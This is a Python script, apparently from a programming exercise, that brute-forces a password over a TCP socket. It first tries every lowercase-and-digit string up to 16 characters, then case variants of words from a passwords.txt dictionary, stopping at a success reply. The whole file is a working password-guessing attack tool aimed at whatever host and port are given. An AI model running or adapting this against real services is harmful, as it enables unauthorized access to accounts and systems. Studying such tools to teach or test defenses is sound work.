import itertools
import os
import socket
import string
import sys
from typing import Iterable, Generator

HOST = sys.argv[1]
PORT = int(sys.argv[2])
ADDRESS = (HOST, PORT)


class TxtReader:
    """Read txt files"""

    def __init__(self, file_path: str):
        self.file = file_path

    def read(self) -> str:
        with open(self.file) as f:
            for line in f:
                yield line.strip()


class Hack:
    """Password hacking methods"""

    def __init__(self, address: tuple, charset: str = None, reader=TxtReader,
                 file_path: str = None, success_message: str = 'Connection success!'):
        self.address = address
        self.charset = charset
        self.reader = reader
        self.file_path = file_path
        self.success_message = success_message

    def brute_force_passwords(self, minlength: int = 1, maxlength: int = 16) -> str:
        """Iterates over all possible combinations characters of charset from minlength to maxlength.
            If receives in response self.success_message returns password"""

        password_generator = brute_force(self.charset, minlength, maxlength + 1)

        with socket.socket() as connection:
            connection.connect(self.address)
            for password in password_generator:
                correct_password = send_data(connection, password, success_message=self.success_message)
                if correct_password:
                    return password

    def brute_typical_passwords(self) -> str:
        """Iterates over all possible combinations of case letters from the file with passwords.
            If receives in response self.success_message returns password"""

        self.charset = TxtReader(self.file_path).read()
        with socket.socket() as connection:
            connection.connect(self.address)
            for pwd in self.charset:
                password_generator = generate_typical_passwords(pwd)
                for password in password_generator:
                    correct_password = send_data(connection, password, success_message=self.success_message)
                    if correct_password:
                        return password


def brute_force(charset: Iterable, minlength: int, maxlength: int) -> str:
    """Takes an iterable object with a sequence of possible characters.
        Minimum and maximum combination length. Generates all possible combinations"""

    for length in range(minlength, maxlength + 1):
        for char in itertools.product(charset, repeat=length):
            yield ''.join(char)


def generate_typical_passwords(password: str) -> str:
    """Generates all possible combinations of case letters from a takes password"""
    
    password_chars = [{char.upper(), char.lower()} for char in password]  # set
    for pwd in itertools.product(*password_chars):
        yield ''.join(pwd)


def send_data(connection, password: str, success_message: str = 'Connection success!') -> bool:
    """Takes the opened connection, password and message that is expected to be received on success.
        Sends the password by the connection and listens for the response,
        if receives a success message in response, returns True"""

    encoded_password = password.encode()
    try:
        connection.send(encoded_password)
        response = connection.recv(1024)
        response = response.decode()
        if response == success_message:
            return True
    except ConnectionAbortedError:
        pass

    return False


def main():
    charset = string.ascii_lowercase + string.digits

    brute = Hack(ADDRESS, charset)
    password = brute.brute_force_passwords(1, 16)
    print(password)

    path_to_passwords = f'{os.path.join(os.path.dirname(os.path.abspath(__file__)))}\\passwords.txt'

    brute_typical_passwords = Hack(ADDRESS, file_path=path_to_passwords)
    password = brute_typical_passwords.brute_typical_passwords()
    print(password)


if __name__ == '__main__':
    main()
